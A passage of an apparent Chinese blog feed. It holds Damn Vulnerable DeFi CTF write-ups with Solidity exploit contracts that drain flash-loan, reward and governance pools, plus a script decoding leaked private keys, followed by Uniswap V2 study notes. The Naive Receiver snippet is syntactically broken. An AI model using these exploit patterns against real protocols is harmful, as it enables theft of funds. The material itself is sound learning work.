条，而这就用到了 Multicall 合约里的 multicall 方法了。</p>
<p>我们看第一种方法：调用 10 次 flashLoan，交 10 次 1WETH
的手续费，就能把 WETH 汇总在 deployer 的 deposits 中。不过这 10
次交易需要用 multicall
一起执行，不然会超出第一条限制的要求。然后，我们再通过 execute 调用
withdraw，就可以把这里面的存款全都转到 recovery
中了。不过这里我们选择把两条交易合并作一条，也就是把 withdraw 的 abi
编码与前10条 flashLoan 的编码合在一起。exp如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function test_naiveReceiver() public checkSolvedByPlayer &#123;</span><br><span class="line">    bytes[] memory callData = new bytes[](11);</span><br><span class="line">    for (uint256 i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">        callData[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, bytes(&quot;&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    callData[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)));</span><br><span class="line">        bytes32(uint256(uint160(deployer))),</span><br><span class="line">    );</span><br><span class="line">    bytes memory multicallData = abi.encodeCall(Multicall.multicall, callData);</span><br><span class="line">    BasicForwarder.Request memory request = BasicForwarder.Request(&#123;</span><br><span class="line">        from: player,</span><br><span class="line">        target: address(pool),</span><br><span class="line">        value: 0,</span><br><span class="line">        gas: 1e7,</span><br><span class="line">        nonce: forwarder.nonces(player),</span><br><span class="line">        data: multicallData,</span><br><span class="line">        deadline: block.timestamp + 1 days</span><br><span class="line">    &#125;);</span><br><span class="line">    bytes32 requestHash = keccak256(</span><br><span class="line">        abi.encodePacked(</span><br><span class="line">            &quot;\x19\x01&quot;,</span><br><span class="line">            forwarder.domainSeparator(),</span><br><span class="line">            forwarder.getDataHash(request)</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);</span><br><span class="line">    bytes memory signature = abi.encodePacked(r, s, v);</span><br><span class="line">    forwarder.execute(request, signature);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="truster">[3] Truster</h1>
<p>这道题的合约代码量很小，就实现了一个闪电贷，让我们通过闪电贷的交易过程，把合约里的钱都转走。</p>
<p>想转走代币一共有两种方法，第一种是直接让可信用户调用 transfer
函数，第二种是让恶意用户成为可信用户后，再通过恶意用户转账。由于
flashLoan 设置了代币数目检查，所以我们没办法在 flashLoan 的
target.functionCall 中直接调用 transfer，但我们可以采取
approve，让恶意合约有操控代币的权限。</p>
<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract TrusterExploiter &#123;</span><br><span class="line">    TrusterLenderPool public pool;</span><br><span class="line">    DamnValuableToken public token;</span><br><span class="line">    address recovery;</span><br><span class="line"></span><br><span class="line">    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        token = _token;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns (bool) &#123;</span><br><span class="line">        require(pool.flashLoan(</span><br><span class="line">            0,</span><br><span class="line">            address(this),</span><br><span class="line">            address(token),</span><br><span class="line">            abi.encodeCall(token.approve,(address(this), 1_000_000e18))</span><br><span class="line">        ));</span><br><span class="line">        token.transferFrom(address(pool), address(this), 1_000_000e18);</span><br><span class="line">        token.transfer(recovery, 1_000_000e18);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TrusterChallenge is Test &#123;</span><br><span class="line">    ...</span><br><span class="line">    function test_truster() public checkSolvedByPlayer &#123;</span><br><span class="line">        TrusterExploiter exploiter = new TrusterExploiter(pool, token, recovery);</span><br><span class="line">        require(exploiter.attack());</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="side-entrance">[4] Side Entrance</h1>
<p>这题跟上一题很相似，但是上一题用的是代币，这一题就完完全全用的 ether
了。不过我们可以在
<code>IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</code>
里将贷款来的钱再用 deposit 存入 SideEntranceLenderPool
合约中，这样不仅不会影响 RepayFailed，还可以让
balances[IFlashLoanEtherReceiver] = 1000，之后我们 withdraw
即可成功提款，然后转账给 recovery 就好了。exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract IFlashLoanEtherReceiver &#123;</span><br><span class="line">    address player;</span><br><span class="line">    address recovery;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(SideEntranceLenderPool _pool, address _player, address _recovery) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        player = _player;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function callFlashLoan(uint256 amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">        payable(recovery).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SideEntranceChallenge is Test &#123;</span><br><span class="line">    ...</span><br><span class="line">    function test_sideEntrance() public checkSolvedByPlayer &#123;</span><br><span class="line">        IFlashLoanEtherReceiver receiver = new IFlashLoanEtherReceiver(pool, player, recovery);</span><br><span class="line">        receiver.callFlashLoan(1000e18);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="the-rewarder">[5] The Rewarder</h1>
<p>漏洞在 claimRewards 里，同一次 claim 多个相同的账户不会有问题...</p>
<p>因为第一次调用，address(token) ==
address(0)，不会进入_setClaimed，之后的调用 token ==
inputTokens[inputClaim.tokenIndex]，进入 else
分支，也不会进入_setClaimed，等到下一种代币的时候，你就算把我上一个代币
setClaimed 也没用了。</p>
<p>感觉还是审代码的耐心不够..不清楚 merkel tree
的工作原理，想一笔调用干净，但每次 claim 的 amount 也要完全符合 json
文件里的 amount，所以只能多笔。</p>
<p>那既然想到多笔调出来，就肯定要研究 claimRewards
函数，然后模拟一下就能发现这个 if 判断条件有问题。</p>
<p>沉下心来，欲速则不达。</p>
<p>exp如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function test_theRewarder() public checkSolvedByPlayer &#123;</span><br><span class="line">        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;</span><br><span class="line">        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;</span><br><span class="line"></span><br><span class="line">        bytes32[] memory dvtLeaves = _loadRewards(&quot;/test/the-rewarder/dvt-distribution.json&quot;);</span><br><span class="line">        bytes32[] memory wethLeaves = _loadRewards(&quot;/test/the-rewarder/weth-distribution.json&quot;);</span><br><span class="line"></span><br><span class="line">        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;</span><br><span class="line">        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;</span><br><span class="line">        uint totalTxCount = dvtTxCount + wethTxCount;</span><br><span class="line"></span><br><span class="line">        IERC20[] memory tokensToClaim = new IERC20[](2);</span><br><span class="line">        tokensToClaim[0] = IERC20(address(dvt));</span><br><span class="line">        tokensToClaim[1] = IERC20(address(weth));</span><br><span class="line"></span><br><span class="line">        // Create Alice&#x27;s claims</span><br><span class="line">        Claim[] memory claims = new Claim[](totalTxCount);</span><br><span class="line"></span><br><span class="line">        for (uint i = 0; i &lt; totalTxCount; i++) &#123;</span><br><span class="line">            if (i &lt; dvtTxCount) &#123;</span><br><span class="line">                claims[i] = Claim(&#123;</span><br><span class="line">                    batchNumber: 0, // claim corresponds to first DVT batch</span><br><span class="line">                    amount: PLAYER_DVT_CLAIM_AMOUNT,</span><br><span class="line">                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array</span><br><span class="line">                    proof: merkle.getProof(dvtLeaves, 188) // Alice&#x27;s address is at index 2</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                claims[i] = Claim(&#123;</span><br><span class="line">                    batchNumber: 0, // claim corresponds to first DVT batch</span><br><span class="line">                    amount: PLAYER_WETH_CLAIM_AMOUNT,</span><br><span class="line">                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array</span><br><span class="line">                    proof: merkle.getProof(wethLeaves, 188) // Alice&#x27;s address is at index 2</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        distributor.claimRewards(&#123;</span><br><span class="line">            inputClaims: claims,</span><br><span class="line">            inputTokens: tokensToClaim</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        dvt.transfer(recovery, dvt.balanceOf(player));</span><br><span class="line">        weth.transfer(recovery, weth.balanceOf(player));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="selfie">[6] Selfie</h1>
<p>这道题实现了个 fancy governance mechanism，如果我们通过
governance.executeAction 调用
emergencyExit(player)，应该就可以提取所有的钱了。</p>
<p>主要问题有两个，第一个是绕过 queueAction 里的
_hasEnoughVotes，这个可以通过在 onFlashLoan 里调用 queueAction
来实现</p>
<p>第二个问题是要绕过 timestamp，让 timedelta 大于 2
days。这个我实在想不出来了，我觉得现实中应该就是隔两天之后再调用，就能绕过了吧。</p>
<p>看完别人的wp，居然直接用vm.warp(block.timestamp + 2
days);绕过了...好吧，exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &#123;IERC3156FlashBorrower&#125; from &quot;openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Expoliter is IERC3156FlashBorrower &#123;</span><br><span class="line">    bytes32 private constant CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    address recovery;</span><br><span class="line">    uint256 actionId;</span><br><span class="line"></span><br><span class="line">    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;</span><br><span class="line">    uint256 constant TOKENS_IN_POOL = 1_500_000e18;</span><br><span class="line"></span><br><span class="line">    DamnValuableVotes token;</span><br><span class="line">    SimpleGovernance governance;</span><br><span class="line">    SelfiePool pool;</span><br><span class="line">    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">        governance = _governance;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(address receiver, address _token, uint256 _amount, uint256 nonce, bytes calldata _data) public returns (bytes32) &#123;</span><br><span class="line">        token.delegate(address(this));</span><br><span class="line">        token.approve(address(pool), TOKENS_IN_POOL);</span><br><span class="line">        actionId = governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (recovery)));</span><br><span class="line">        return CALLBACK_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1() public &#123;</span><br><span class="line">        pool.flashLoan(this, address(token), TOKENS_IN_POOL, &quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step2() public &#123;</span><br><span class="line">        governance.executeAction(actionId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test_selfie() public checkSolvedByPlayer &#123;</span><br><span class="line">    Expoliter expoliter = new Expoliter(token, governance, pool, recovery);</span><br><span class="line">    expoliter.step1();</span><br><span class="line">    vm.warp(block.timestamp + 2 days);</span><br><span class="line">    expoliter.step2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="compromised">[7] Compromised</h1>
<p>这题是真懵b了，不知道题面给的那串数字有什么用，看了wp之后可以通过它来解码私钥，解码exp如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToAscii</span>(<span class="params">hex</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> ascii = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; hex.<span class="property">length</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        ascii += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(i, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ascii;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decodeBase64</span>(<span class="params">base64Str</span>) &#123;</span><br><span class="line">    <span class="comment">// Decode Base64 to ASCII</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">atob</span>(base64Str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> leakedInformation = [</span><br><span class="line">    <span class="string">&#x27;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">leakedInformation.<span class="title function_">forEach</span>(<span class="function"><span class="params">leak</span> =&gt;</span> &#123;</span><br><span class="line">    hexStr = leak.<span class="title function_">split</span>(<span class="string">` `</span>).<span class="title function_">join</span>(<span class="string">``</span>).<span class="title function_">toString</span>()</span><br><span class="line">    <span class="keyword">const</span> asciiStr = <span class="title function_">hexToAscii</span>(hexStr);</span><br><span class="line">    <span class="keyword">const</span> decodedStr = <span class="title function_">decodeBase64</span>(asciiStr);</span><br><span class="line">    <span class="keyword">const</span> privateKey = decodedStr;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Private Key:&quot;</span>, privateKey);</span><br><span class="line">    <span class="comment">// Create a wallet instance from the private key</span></span><br><span class="line">    <span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey);</span><br><span class="line">    <span class="comment">// Get the public key</span></span><br><span class="line">    <span class="keyword">const</span> address = wallet.<span class="property">address</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Public Key:&quot;</span>, address);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>得到下面的结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Private Key: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</span><br><span class="line">Public Key: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15</span><br><span class="line">Private Key: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</span><br><span class="line">Public Key: 0x81A5D6E50C214044bE44cA0CB057fe119097850c</span><br></pre></td></tr></table></figure>
<p>受不了了...我也compromise了，不懂怎么在forge里验证公私钥，先略过去了👉👈</p>
<h1 id="section">[8]</h1>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - Uniswap V2</title>
    <url>/posts/13129.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
学习一下 Uniswap V2
</blockquote>
<span id="more"></span>
<h1 id="前置知识">[1] 前置知识</h1>
<h2 id="ammautomated-market-makers">[1-1] AMM(Automated Market
Makers)</h2>
<p>一种去中心化的交易协议，用于在区块链网络中实现无需订单簿的资产交换。传统交易所通常依赖于买家和卖家通过订单簿来匹配交易，而AMM通过智能合约和算法自动确定资产的价格，从而进行交易。</p>
<p>AMM的基本原理是通过池子（Liquidity
Pools）来提供流动性。流动性池通常由两种或更多种资产组成，并由流动性提供者（LP）存入这些资产。然后，AMM使用特定的算法（例如常见的x
* y =
k公式）来保持池子的平衡，并根据池中资产的相对比例来自动定价。这使得任何用户都可以与流动性池直接交换资产，而无需依赖订单簿。</p>
<p>例如，Uniswap、Sushiswap和Curve
Finance都是基于AMM机制的去中心化交易所（DEX）。这些平台通过激励用户提供流动性，并收取交易费用作为奖励，来维持市场的活跃和流动性。</p>
<p>AMMs的主要优点包括：</p>
<ol type="1">
<li><p>去中心化：交易不需要经过中心化的中介机构，降低了操作的风险。</p></li>
<li><p>无需订单簿：用户可以直接与流动性池进行交易，而不需要找到匹配的买家或卖家。</p></li>
<li><p>流动性提供奖励：流动性提供者通过存入资产来获得交易费用的份额，从而获取被动收入。</p></li>
</ol>
<p>不过，AMM也有一些挑战，例如滑点（交易价格的波动）和无常损失（流动性提供者在池子中资产价格变动时的潜在损失）。</p>
<h2 id="liquidity">[1-2] liquidity</h2>
<p>假设一个 amm 中有代币 x 和代币 y</p>
<p><span class="math display">\[xy = L^2\]</span> 这条曲线定义了一个 AMM
中合法的代币数目，只有在这条曲线上的点代表的代币数量才是合法的。因此，这条曲线也同时定义了流入流出的代币数目，因为一旦增加或减少代币x，代币y的数目也一定会随之变化。</p>
<p>上述方程中的 L
被称为流动性，L越大曲率越小、曲线越平滑，因此交易者交易时 pool
的稳定性更强。通俗来说就是你放进 200 个 token x，会获得接近 200 的 token
y</p>
<h1 id="uniswap-v2-构建">[2] Uniswap V2 构建</h1>
<h2 id="概览">[2-1] 概览</h2>
<p>三个合约构成了 Uniswap V2: factory, router 和 pair</p>
<p>factory contract 用于部署 pair contract</p>
<p>pair contract 是一个持有一对 ERC20
代币的合约，这个合约还允许①用户添加或移除流动性(liqudity)②交易者用自己的代币交换这个
pair 合约中的代币(swap)</p>
<p>router contract 是用户与 pair
合于之间的中介合约，它的主要功能是安全地完成 pair
功能，并且支持多种代币的一次性交换(即 multiple hop swap)</p>
<h2 id="swap">[2-2] swap</h2>
<h3 id="swap-without-fee">[2-2-1] swap without fee</h3>
<p>没有 fee 时的代币换出数目，计算公式如下</p>
<p><span class="math display">\[dy = \frac{L^2}{x1} -
\frac{L^2}{x0}\]</span></p>
<p><span class="math display">\[dy = y_0 - \frac{y_0dx}{x_0 +
dx}\]</span></p>
<h3 id="swap-fee">[2-2-2] swap fee</h3>
<p>swap fee 可以看作是换入换出 token 的手续费：</p>
<p>定义 swap fee rate 'f'，<span class="math inline">\(0 \leq f \leq
1\)</span>，<span class="math display">\[swap fee = f*dx\]</span></p>
<p>那么进入池子的 token x 的数目为：</p>
<p><span class="math display">\[(1-f)*dx\]</span></p>
<p>因此换出的 token x 数目为：</p>
<p><span class="math display">\[dy =
\frac{(1-f)dx*y_0}{x_0+(1-f)dx}\]</span></p>
<h3 id="具体流程">[2-2-3] 具体流程</h3>
<h4 id="single-hop-swap">[2-2-3-1] single hop swap</h4>
<p>用 WETH-DAI 这个代币对举例：</p>
<p>如果 user 想要将 WETH 换成 DAI，user 可以调用 router 中的
swapExactTokensForTokens 函数，这个函数做了一下三件事情：</p>
<p>①调用 TransferFrom 函数，将 WETH 转移到 pair 合约中</p>
<p>②调用 pair 的 swap 函数，计算流入的 WETH 能流出多少 DAI</p>
<p>③调用 transfer 函数，将 DAI 转移到 user 地址</p>
<h4 id="multiple-hop-swap">[2-2-3-2] multiple hop swap</h4>
<p>用 WETH-DAI 和 DAI-MKR 这两个代币对为例：</p>
<p>如果 user 想要将 WETH 换成 MKR，user 可以调用 router 中的
swapExactTokensForTokens 函数，这个函数做了一下五件事情：</p>
<p>①调用 TransferFrom 函数，将 WETH 转移到 WETH-DAI 这个 pair 合约中</p>
<p>②调用 pair 的 swap 函数，计算流入的 WETH 能流出多少 DAI</p>
<p>③调用 transfer 函数，将 DAI 转移到 DAI-MKR 这个 pair 合约中</p>
<p>④调用 pair 的 swap 函数，计算流入的 DAI 能流出多少 MKR</p>
<p>⑤调用 transfer 函数，将 MKR 转移到 user 的地址</p>
<h1 id="代码分析">[3] 代码分析</h1>
<p>主要代码为：<a href="https://github.com/Uniswap/v2-core">v2-core</a>,
<a href="https://github.com/Uniswap/v2-periphery">v2-periphery</a></p>
<h2 id="v2-core">[3-1] v2-core</h2>
<h3 id="uniswapv2erc20">[3-1-1] UniswapV2ERC20</h3>
<p>先来看看用于 ERC20 的变量定义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">using SafeMath for uint; // 为 uint 使用 SafeMath 防止溢出</span><br><span class="line">string public constant name = &#x27;Uniswap V2&#x27;; // ERC20 token name</span><br><span class="line">string public constant symbol = &#x27;UNI-V2&#x27;;   // ERC20 token symbol</span><br><span class="line">uint8 public constant decimals = 18;        // 1e18 的 18</span><br><span class="line">uint  public totalSupply;                   // 总共发行的 token 数目，这里指 LP 代币</span><br><span class="line">mapping(address =&gt; uint) public balanceOf;  // 指每一个 user 拥有的 LP 代币</span><br><span class="line">mapping(address =&gt; mapping(address =&gt; uint)) public allowance; // </span><br></pre></td></tr></table></figure>
<p>ERC712：用于格式化签名，防止重放等攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 public DOMAIN_SEPARATOR;</span><br><span class="line">// keccak256(&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;);</span><br><span class="line">bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;</span><br><span class="line">mapping(address =&gt; uint) public nonces;</span><br><span class="line"></span><br><span class="line">event Approval(address indexed owner, address indexed spender, uint value);</span><br><span class="line">event Transfer(address indexed from, address indexed to, uint value);</span><br><span class="line"></span><br><span class="line">constructor() public &#123;</span><br><span class="line">    uint chainId;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        chainId := chainid</span><br><span class="line">    &#125;</span><br><span class="line">    // 这保证了该 separator 是“某一条链上的某一合约的某一 token 的某一版本”，防御了重放攻击</span><br><span class="line">    DOMAIN_SEPARATOR = keccak256(</span><br><span class="line">        abi.encode(</span><br><span class="line">            keccak256(&#x27;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&#x27;),</span><br><span class="line">            keccak256(bytes(name)),</span><br><span class="line">            keccak256(bytes(&#x27;1&#x27;)),</span><br><span class="line">            chainId,</span><br><span class="line">            address(this)</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他函数与 ERC20 相似，看不懂的话可以去看我博客里关于 openzeppelin
源码分析那一篇文章里与 ERC20 有关的文章。我们来看一些 ERC20
里没有的东西：</p>
<p>如果说 approve 函数是 msg.sender 主动去批准 spender 去消费 msg.sender
的 token，那么 permit 函数更像是 msg.sender 打了一张借条给
spender，然后在 deadline 之前 spender 可以凭此借条去得到该合约的 token
批款。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function permit(</span><br><span class="line">    address owner, </span><br><span class="line">    address spender, </span><br><span class="line">    uint value, </span><br><span class="line">    uint deadline, </span><br><span class="line">    uint8 v, bytes32 r, bytes32 s) external &#123;</span><br><span class="line">    require(deadline &gt;= block.timestamp, &#x27;UniswapV2: EXPIRED&#x27;);</span><br><span class="line">    bytes32 digest = keccak256(</span><br><span class="line">        abi.encodePacked(</span><br><span class="line">            &#x27;\x19\x01&#x27;,</span><br><span class="line">            DOMAIN_SEPARATOR,</span><br><span class="line">            keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    address recoveredAddress = ecrecover(digest, v, r, s);</span><br><span class="line">    require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, &#x27;UniswapV2: INVALID_SIGNATURE&#x27;);</span><br><span class="line">    _approve(owner, spender, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="uniswapv2factory">[3-1-2] UniswapV2Factory</h3>
<p>我们之前说过，Factory 主要用于初始化 token
Pair。我们先来看一些基本的变量定义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 这两个变量都设置了 swap fee 该给谁</span><br><span class="line">address public feeTo;  </span><br><span class="line">address public feeToSetter;</span><br><span class="line">// 记录两个 token 的代币对对应的 pair 合约的地址，比如 getPair[WETHaddress][DAIaddress]</span><br><span class="line">mapping(address =&gt; mapping(address =&gt; address)) public getPair;</span><br><span class="line">address[] public allPairs; // 记录所有 Pair 合约的地址</span><br></pre></td></tr></table></figure>
<p>其他类似于 getter 和 setter
的函数就不仔细说了，只说重点函数，后续的合约也是如此。</p>
<p>createPair 函数定义了如何创建一个 token pair。该函数首先检查了 tokenA
和 tokenB 的地址不能相同且不能为0，然后检查 (token0, token1) 这个 pair
没有创建过。之后使用 UniswapV2Pair 的 creationCode
去构建初始化一个合约，返回的地址存储在 getPair 和 allPairs 当中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function createPair(address tokenA, address tokenB) external returns (address pair) &#123;</span><br><span class="line">    require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">    (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">    require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;);</span><br><span class="line">    require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient</span><br><span class="line">    // memory 类型的前 0x20 字节存储的是动态数组的长度，因此 create2 时要 add(bytecode, 32)</span><br><span class="line">    bytes memory bytecode = type(UniswapV2Pair).creationCode;</span><br><span class="line">    bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">    assembly &#123;</span><br><span class="line">        pair := create2(0, add(bytecode, 32), mload(bytecode), salt)</span><br><span class="line">    &#125;</span><br><span class="line">    IUniswapV2Pair(pair).initialize(token0, token1);</span><br><span class="line">    getPair[token0][token1] = pair;</span><br><span class="line">    getPair[token1][token0] = pair; // populate mapping in the reverse direction</span><br><span class="line">    allPairs.push(pair);</span><br><span class="line">    emit PairCreated(token0, token1, pair, allPairs.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="uniswapv2pair">[3-1-3] UniswapV2Pair</h3>
<p>常规定义如下。值得注意的是价格累加器，该变量用于计算时间加权平均价格(TWAP)，TWAP主要有以下三个作用：①
减少价格操纵 ② 提高价格稳定性 ③
用于预言机，为其他合约提供可靠的价格信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">using SafeMath  for uint;</span><br><span class="line">using UQ112x112 for uint224; // UQ112x112 代表 112 位整数 112 位小数</span><br><span class="line"></span><br><span class="line">uint public constant MINIMUM_LIQUIDITY = 10**3; // 最小流动性为 1000</span><br><span class="line">bytes4 private constant SELECTOR = bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;)));</span><br><span class="line"></span><br><span class="line">address public factory;</span><br><span class="line">address public token0;</span><br><span class="line">address public token1;</span><br><span class="line"></span><br><span class="line">uint112 private reserve0;           // uses single storage slot, accessible via getReserves</span><br><span class="line">uint112 private reserve1;           // uses single storage slot, accessible via getReserves</span><br><span class="line">uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves</span><br><span class="line"></span><br><span class="line">uint public price0CumulativeLast;   // 价格累加器</span><br><span class="line">uint public price1CumulativeLast;   // 价格累加器</span><br><span class="line">uint public kLast; // reserve0 * reserve1, 最近一次 liquidity 更新时的 K</span><br><span class="line"></span><br><span class="line">uint private unlocked = 1; // 重入锁</span><br></pre></td></tr></table></figure>
<p>Pair
合约实现了两个意外处理函数<code>skim</code>和<code>sync</code>，</p>
<p>skim(address to):
当由于外部转账或其他原因导致合约中某个代币的余额多于其储备量时，可以调用
skim
函数将多余的代币转移到指定地址。这可以确保合约中的代币余额与其储备量一致，防止意外的资金滞留在合约中。比如某个用户错误地向合约地址发送了代币，导致合约的余额多于储备量。此时，可以调用
skim 函数将多余的代币转移到指定的救助地址。</p>
<p>sync():当合约的储备量与实际余额不一致时，可以调用 sync
函数更新储备量，使其与当前的实际余额一致。这在发生外部代币转账、合约升级或其他操作导致不一致时特别有用。比如在合约升级过程中，某些代币的余额发生了变化，但储备量没有及时更新。此时，可以调用
sync 函数同步储备量与实际余额。</p>
